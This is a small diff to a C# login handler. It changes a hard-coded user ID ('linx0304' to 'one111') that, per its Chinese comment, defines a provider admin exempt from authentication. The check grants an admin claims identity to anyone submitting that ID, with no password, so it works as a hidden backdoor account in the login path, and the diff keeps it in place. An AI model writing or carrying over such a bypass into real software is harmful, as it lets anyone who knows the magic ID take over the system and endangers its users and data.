@@ -14,7 +14,7 @@ namespace HBYWCZP2024.Mediator.Handlers
     {
         public async Task<bool> Handle(LoginCommand request, CancellationToken cancellationToken)
         {
-            if (request.userId == "linx0304")
+            if (request.userId == "one111")
             {
                 // 新定义一个provider admin免认证
                 var admin = new ClaimsPrincipal(new ClaimsIdentity("login"));
